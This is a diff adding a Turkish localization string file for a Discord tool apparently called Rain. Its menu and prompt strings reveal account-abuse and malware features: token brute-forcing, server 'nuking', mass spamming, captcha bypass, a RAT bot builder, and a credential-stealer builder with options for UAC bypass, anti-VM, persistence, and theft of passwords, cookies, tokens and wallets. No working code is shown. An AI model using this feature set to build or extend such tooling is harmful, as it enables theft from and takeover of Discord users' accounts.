@@ -1,0 +1,396 @@
+Token Bilgisi{end_space12}
+Token Girişi{end_space14}
+Token Yıkıcı{end_space13}
+Token Kapıcısı{end_space11}
+Token Devre Dışı Bırakıcı
+Token Kaba Kuvvet{end_space8}
+Sahte Yazıcı{end_space13}
+Gurur Keskin Nişancısı{end_space3}
+Grup Sohbeti Spamcısı{end_space4}
+Arkadaş Engelleme{end_space8}
+Arkadaşları Kaldırıcı{end_space9}
+Arkadaşlık İstek Silici{end_space2}
+Yeni Sunucular Oluştur{end_space3}
+Profil Değiştirici{end_space7}
+QR Kodu Kapıcısı{end_space9}
+Discord Rat Botu{end_space9}
+Düğme Basıcısı{end_space11}
+Mesaj Reaktörü{end_space11}
+Toplu Mesaj{end_space14}
+Toplu Bildirim{end_space11}
+Toplu Arkadaş{end_space12}
+DM Silici{end_space16}
+DM Temizleyici{end_space11}
+Kural Atlatıcı{end_space11}
+RestoreCord Atlatıcı{end_space5}
+Sledge Hammer Atlatıcı{end_space3}
+Webhook Aracı{end_space12}
+Plingenn Yaptı{end_space11}
+Değişiklik Günlüğü{end_space7}
+Ayarlar{end_space18}
+Sohbet
+Tokenleri Yönet
+Sonraki{end_space4}
+Şu anda çalışıyor:{end_space6}
+Geçersiz seçim, lütfen tekrar deneyin!
+Kullanıcı tarafından kesildi.
+Tema Değiştirici
+Hesap Ayarları
+Proxy Ayarları
+Görünüm Ayarları
+Hata Ayıklama Modu Geçişi
+Yönetici Paneli
+Geçersiz Ayar
+SİYAH
+MAVİ
+YEŞİL
+KIRMIZI
+BEYAZ
+SARI
+MOR
+AÇIK KIRMIZI
+AÇIK MAVİ
+AÇIK YEŞİL
+AÇIK SİYAN
+AÇIK SİYAH
+Tema olarak ayarlandı
+Hesap Genel Bakışı
+Lisansım
+Satın Alma Geçmişi
+Kodu Kullan
+Yazılımı İndir
+Kullanıcı adı
+Oluşturuldu
+Kullanıcı Adı Değiştir
+Çıkış yap
+Kullanıcı adı değiştirilemedi, Kullanıcı adı en az 3 karakter içermelidir.
+Hesabınızdan Çıkış yapmak istiyor musunuz? (E/H)
+Ürün
+Bitiş tarihi
+Tarih
+İçeriğinizi almak için ürün kodunuzu girin.
+Kod
+Kodu zaten kullandınız.
+Giriş yapmadan önce ürününüzü kaydetmeyi unutmayın!
+Yanıtta anahtar bulunamadı
+Sağlanan kod için veri alınamadı
+Kod bilgisinde URL bulunamadı
+Geçersiz Kod!
+Proxy Kullanımını Değiştir
+Proxy Önbelleğini Temizle
+Kendi Proxy'lerinizi Önbelleğe Ekle
+Proxy Kazı
+Geçersiz Seçim
+Hata Ayıklama Modu Değiştirildi {KIRMIZI}KAPALI
+Hata Ayıklama Modu Değiştirildi {YEŞİL}AÇIK
+Yeni Kimlik Doğrulama Sistemi Eklendi
+Yeniden Yapılandırma Sistemi İyileştirildi
+Panel Arayüzü Yeniden Yapılandırıldı
+Sohbet Sistemi Eklendi
+Yeni hesap ayarları eklendi
+Daha iyi performans için önbellekleme uygulandı
+Özel Discord RPC
+Discord RPC Kullanımını Değiştir
+Özel Discord RPC Kullanımını Değiştir
+Özel Discord RPC Düzenle
+Özel Discord RPC Kullanımı KAPALI
+Özel Discord RPC Kullanımı AÇIK
+Ayrıntılar (Gerekli)
+Ayrıntılar en az 3 karakter uzunluğunda olmalıdır.
+Durum (Gerekli)
+Durum en az 3 karakter uzunluğunda olmalıdır.
+Büyük resim URL'si (İsteğe bağlı)
+Büyük metin (İsteğe bağlı)
+Küçük resim URL'si (İsteğe bağlı)
+Küçük metin (İsteğe bağlı)
+Kaç düğme istersiniz?
+Düğme için etiket girin
+Düğme için URL girin
+Geçersiz URL biçimi. Lütfen geçerli bir URL girin.
+Geçersiz düğme sayısı. Lütfen 0 ile 2 arasında bir sayı girin.
+Discord RPC KAPALI olarak değiştirildi
+Discord RPC AÇIK olarak değiştirildi
+Normal Mod
+RestoreCord Modu (captcha atlatma)
+Önbellek Kontrolü
+Özel Kontrol
+Sunucu Kontrolü
+Token yüklemek için özel yolunuzu girin
+Normal Sohbet
+Destek Sohbeti (Uygun değil)
+Özel Sohbet (Uygun değil)
+Sunucu Arama{end_space13}
+Sunucu Klonlayıcı{end_space8}
+Sunucu Yok Ettirici{end_space6}
+Token Birleştirici{end_space7}
+Token Ayrımcı{end_space12}
+Token Spamcı{end_space13}
+Nöbet Tutma{end_space14}
+Ses Kartı Spamcısı{end_space7}
+Sesli Sohbet Katılımcısı{end_space1}
+Profil Resmi Değiştirici{end_space5}
+Genel Takma Ad Değişimci{end_space1}
+Sunucu Takma Adı Değiştirici
+HypeSquad Değiştirici{end_space4}
+Zamirler Değiştirici{end_space5}
+Dil Değiştirici{end_space10}
+Durum Değiştirici{end_space8}
+Tema Değiştirici{end_space9}
+Biyografi Değiştirici{end_space4}
+Hesap Oluşturucu{end_space9}
+VideoÇökme Yapıcı{end_space8}
+Ayarlar Döngüsü{end_space14}
+Güncelleme Notları{end_space7}
+Telegram{end_space17}
+Selfbot{end_space18}
+Github{end_space19}
+Hakkında{end_space17}
+Çıkış{end_space20}
+Önceki Sayfa{end_space3}
+Sunucu Adları
+Mesaj
+Konu Sayısı
+Bir hata oluştu:
+Önbellekte hiçbir token bulunamadı
+Rain Nuke dağıtılıyor
+Rain Nuke başarıyla dağıtıldı...
+Mesaj Gönderme
+Mesaj ID'si:
+Tüm mevcut arkadaşlara mesaj gönderildi.
+Sunucudan ayrıldı:
+Sunucu silindi:
+Aşağıdaki hata ile karşılaşıldı ve görmezden geliniyor:
+Tüm mevcut sunucular silindi/ayrıldı.
+Arkadaşı Kaldırma:
+Arkadaş Kaldırıldı:
+Tüm mevcut arkadaşlar kaldırıldı.
+Oluşturuluyor
+Oluşturuldu
+Tüm sunucular oluşturuldu.
+Rain Nuke başarıyla patlatıldı!
+Başarıyla Reme Çölü'ne dönüştü
+Devam etmek için bir şeyler girin...
+Nöbet modu başlatılıyor (Aydınlık/karanlık modu açma/kapama)
+Devam etmek için yeterli arkadaş yok.
+Token işlenirken bir hata oluştu
+Kanal Spamcısı
+Kanal Kimliği
+Kuralları Atla
+Sunucu Kimliği
+Sahte Yazıcı Token
+Genel Takma Ad Değiştirici
+Takma Ad
+Sunucu Takma Ad Değiştirici
+Zamirler Değiştirici
+Rastgele Zamirler (e/h)
+Zamirler
+Silinen DM:
+Devam etmek için yeterli DM yok.
+Döngü kesildi
+Ses Kartı Spamcısı
+Kullanıcı tarafından program kesildi.
+Token ile kalp atışı gönderilemedi:
+Token ile sesli sohbete katılınamadı:
+Token'lerle sesli sohbete katılıyor...
+Davet başarıyla güncellendi, sunucunuz artık erişilebilir
+Vanity URL'si güncellenemedi. Durum kodu:
+Nişan almak için Vanity kodu
+Vanity uygulanacak sunucu ID'si
+Kontroller arası gecikme (saniye)
+Vanity Kesicisi başlatıldı. Durdurmak için Ctrl+C'ye basın.
+Hata:
+Webhook Spammer
+Webhook Silici
+Webhook
+Webhook başarıyla silindi
+Token Yöneticisi
+Tokenları Kaydet
+Tokenları Temizle
+Tokenları Kontrol Et ve Sadece Geçerli Olanları Kaydet (e/h)
+Token Önbelleği Boşaltıldı.
+Tokenları içeren metin dosyasının yolunu girin
+Belirtilen metin dosyasında token bulunamadı
+Token Kontrolcüsü
+Sunucu adı alınamadı:
+Katılıyor
+Yağmur token kaba kuvvet. Not: Bu uzun bir süre alabilir.
+Eğer çok şanslıysanız ve birinin token'ını almayı başarırsanız, bunu 'brute-force.txt' içinde bulacaksınız.
+Bir kişinin hesabında brute force saldırısı yapmadan önce her zaman açık izin alın.
+Geçersiz kullanıcı kimliği, lütfen yeniden deneyin!
+GEÇERLİ
+GEÇERSİZ
+Faturalama kaynakları alınamıyor:
+Nitro verileri alınamıyor:
+Fatura bilgisi bulunamadı.
+Kullanıcı bilgileri ve sürücüler toplanıyor..
+Dosya Adı
+Dosya Şifresi
+İkon dosyası sağlamak ister misiniz? (E/H)
+Geçersiz ikon yol veya URL. İkon ayarı yapılmadı.
+Beni Pingle (E/H)
+Anti VM (E/H)
+Başlangıçta Başlat (E/H)
+UAC Atlatma (E/H)
+Erit (E/H)
+Konsolu Gizle (E/H)
+Web kamerasını Yakala (E/H)
+Şifreleri Yakala (E/H)
+Çerezleri Yakala (E/H)
+Otomatik Dolduruları Yakala (E/H)
+Geçmişi Yakala (E/H)
+Discord Token'larını Yakala (E/H)
+Oyunları Yakala (E/H)
+WiFi Şifrelerini Yakala (E/H)
+Sistem Bilgisini Yakala (E/H)
+Ekran Görüntüsü Yakala (E/H)
+Telegram'ı Yakala (E/H)
+Ortak Dosyaları Yakala (E/H)
+Cüzdanları Yakala (E/H)
+Sahte Hata (E/H)
+Sahte Hata Başlığı
+Sahte Hata Mesajı
+Av Sitesini Engelle (E/H)
+Discord Enjeksiyonu (E/H)
+Dosya İkonu
+{isim}.exe oluşturuluyor, Bu birkaç saniye sürebilir. Sabrınız için teşekkürler!
+Dosya 'output/grabberbuilder/{isim}.exe konumuna alındı.
+Grup sohbeti oluşturuldu
+Sınırlandırılmış oran ({response.json()['retry_after']}ms)
+Rastgele seçim için yeterli arkadaş yok
+Grup sohbeti spamı için kullanıcıları kendiniz mi seçmek istersiniz yoksa rastgele mi seçmek istersiniz?
+Kullanıcıları kendiniz seçin
+Kullanıcıları rastgele seçin
+Grup sohbetleri oluşturuluyor
+Kullanıcı kimlikleri
+Virgül (,) yoktu, biçim id,id2,id3
+herhangi bir zamanda durdurmak için
+Engellendi:
+İlişkiler alınamadı:
+Devam etmek için yeterli arkadaşlık isteği yok.
+Gelen Arkadaşlık İsteği:
+Arkadaşlık İsteği Kaldırıldı:
+Toplam Arkadaşlık İsteği Kaldırıldı:
+{server_name} oluşturulurken bir hata oluştu: {e}
+sunucu simgeleri evet/hayır
+Rastgele sunucu adları
+Özel sunucu adları
+Oluşturulacak sunucuların adı
+Lütfen ikon konumunu girin
+Bilgisayarınızda "{image}" bulunamadı
+Özel Durum
+Özel Biyografi
+Dosya Oluşturuluyor... {i}
+Dosya Yazılıyor... {i}
+Not: Bu kod şu anda tam olarak çalışır durumda değil, ancak çalıştırılabilir.\nAncak, hatalar veya hatalarla karşılaşabilirsiniz.
+Son dosyaya vermek istediğiniz adı girin
+RAT komutlarını çalıştırmak için kullanacağınız botun belirteci
+Bot belirteci
+Kesme komutları kayıtlı olan guild ID'sini girin
+Dosya yazma hatası: {e}
+Dosya doğru şekilde "output/{dosyaAdı}.py" konumuna yazıldı
+Komut dosyanızı yürütülebilir bir dosyaya dönüştürün (E/H)
+Dosya oluşturuluyor...
+Eski dosyalar temizleniyor...
+Yürütülebilir dosya doğru şekilde oluşturuldu
+HTTP hatası oluştu: {e}
+Mesaj kimliği
+Basmak istediğiniz düğmeyi seçin
+{r}({LIGHTBLACK_EX}{i}{r}) Ad: {LIGHTBLACK_EX}{düğme_etiketi}{r}, Özel Kimlik: {LIGHTBLACK_EX}{düğme_özel_kimliği}
+Düğme
+Mesajda yalnızca bir düğme bulundu.
+Tepki {reaction} mesajına ekleme başarısız oldu {message_id}. Zaten maksimum tepki sayısına ulaşıldı.
+Zaten maksimum tepki sayısına ulaşıldı.
+Tepki {reaction} mesajına ekleme başarısız oldu {message_id}. Yasaklanmış: {error_message}
+Nesneler
+Yüzler
+Hayvanlar
+Semboller
+Yanıtta emoji bulunamadı
+API'den emoji alınamadı
+Davet bağlantısı
+Geçersiz davet bağlantısı biçimi
+Talep gönderilirken bir hata oluştu
+Davet Bilgileri:
+Davet Eden Bilgileri:
+Sunucu Bilgileri:
+Kanal
+Süresi Dolma Tarihi
+Kullanıcı Kimliği
+Rozetler
+Uygun değil
+İsim
+Sunucu Kimliği
+Açıklama
+Banner
+Banner URL'si
+Banner URL'si (Uygun değil)
+Hayal URL'si
+Doğrulama Seviyesi
+Sıçrama
+Sıçrama URL'si
+Sıçrama URL'si (Uygun değil)
+Özellikler
+Nöbet Başladı. Durdurmak için Ctrl+C'ye basın.
+Nöbet kesildi
+Dil döngüsü başladı. Durdurmak için Ctrl+C'ye basın.
+Geçersiz Token.
+Devam etmek için ENTER tuşuna basın
+Discord API Aracı | https://Rain.xyz | Plingenn tarafından yapıldı
+Görünüm Ayarları
+Metin Ayarları
+İmleç Ayarları
+Şeffaflık Ayarları
+Pencere Ayarları
+Dil Ayarları
+Renk Düzeni
+Yazı Tipi
+Yazı Boyutu
+Satır Yüksekliği
+Yazı Kalınlığı
+Retro Terminal Efektleri
+Renk Ayarları
+Yazı Tipi Ayarları
+Yazı Boyutu Ayarları
+Satır Yüksekliği Ayarları
+Yazı Kalınlığı Ayarları
+Retro Ayarları
+İmleç Ayarları
+Dil şu dil olarak ayarlandı: {chosen_language}
+İsimsiz
+Tür
+Ev
+Mesaj bağlantısı
+Geçersiz mesaj bağlantısı
+Geri Dön...
+Discord RPC'ye bağlanılamadı: {e}
+Seçenek
+Tema
+Ayar
+Düzenle
+Dil
+Panel Opaklığı
+Geçersiz Opaklık
+Pencere Ayarları
+Bu Seçenek Devam Ediyor
+Bu seçenek şu anda kullanılamıyor. Daha sonra eklenmesi için lütfen sabırlı olun.
+Bu seçenek şu anda kullanılamıyor.
+Yakında şu ile değiştirilecek: '{replacement}'.
+Bu Seçenek Mevcut Değil
+Bu seçenekler şu anda geliştirme aşamasında
+Bu seçenekler şu anda geliştirme aşamasında olup kullanılabilir durumdadır. Ancak, hatalar veya hatalar oluşabilir.
+{pronounce_url}'den zamirler alınamadı ({statuscode})
+Vekil kullanımı şu anda kullanılamıyor. Herhangi bir rahatsızlık için özür dileriz. Yaklaşan güncellemelerden birinde erişilebilir hale getirilecektir.
+Vekil Kullanımı Kapalı {RED}KAPALI
+Vekil Kullanımı Açık {GREEN}AÇIK
+Yeni Vekiller Başarıyla Yazıldı
+Başarıyla Vekil Alındı
+Tamamlandı! Toplamda {proxies} vekil alındı => {temp} | {execution_time}ms
+PC{end_space5}
+Çoklu dil desteği uygulandı.
+Toplu Başlık{end_space13}
+Forum Spamcısı
+Kullanıcılara Toplu DM{end_space3}
+Uygulanamaz{end_space14}
+Sunucu Artırıcı{end_space15}
+Token Çevrimiçi Kullanıcı
+Anket Oluşturucu{end_space9}
